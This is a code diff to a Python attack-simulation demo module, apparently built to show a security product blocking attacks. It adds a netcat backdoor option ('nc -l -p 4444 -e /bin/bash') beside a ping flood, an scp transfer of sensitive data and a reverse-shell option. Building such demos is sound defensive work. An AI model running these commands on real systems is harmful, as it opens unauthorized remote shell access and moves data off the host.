@@ -41,7 +41,7 @@ class AttackSimulationDemo(DemoModule):
                 required=True,
                 options=[
                     {"value": "dos_ping", "label": "DoS Ping Flood (40KB)"},
-                    {"value": "zypper_install", "label": "Package Install (zypper)"},
+                    {"value": "nc_backdoor", "label": "NC Backdoor (netcat listener)"},
                     {"value": "scp_transfer", "label": "File Transfer (scp)"},
                     {"value": "reverse_shell", "label": "Reverse Shell"},
                 ],
@@ -96,7 +96,7 @@ class AttackSimulationDemo(DemoModule):
         # Get attack type label for display
         attack_labels = {
             "dos_ping": "DoS Ping Flood (40KB payload)",
-            "zypper_install": "Package Install (zypper)",
+            "nc_backdoor": "NC Backdoor (netcat listener)",
             "scp_transfer": "File Transfer (scp)",
             "reverse_shell": "Reverse Shell",
         }
@@ -117,10 +117,10 @@ class AttackSimulationDemo(DemoModule):
             # DoS Ping Flood with 40KB payload
             cmd_args = ["ping", "-s", "40000", "-c", "5", target_addr]
             yield "[INFO] Simulating DoS attack with oversized ICMP packets (40KB payload)"
-        elif attack_type == "zypper_install":
-            # Package installation attempt
-            cmd_args = ["zypper", "install", "-y", "curl"]
-            yield "[INFO] Attempting unauthorized package installation"
+        elif attack_type == "nc_backdoor":
+            # Netcat backdoor listener - will be blocked in Protect mode
+            cmd_args = ["nc", "-l", "-p", "4444", "-e", "/bin/bash"]
+            yield "[INFO] Attempting to start netcat backdoor listener on port 4444"
         elif attack_type == "scp_transfer":
             # File transfer of sensitive data
             cmd_args = ["scp", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
@@ -163,8 +163,8 @@ class AttackSimulationDemo(DemoModule):
                 if attack_type == "dos_ping":
                     if 'bytes from' in lower_line or 'time=' in lower_line:
                         command_success = True
-                elif attack_type == "zypper_install":
-                    if 'already installed' in lower_line or 'nothing to do' in lower_line:
+                elif attack_type == "nc_backdoor":
+                    if 'listening' in lower_line:
                         command_success = True
                 elif attack_type == "scp_transfer":
                     if '100%' in line:
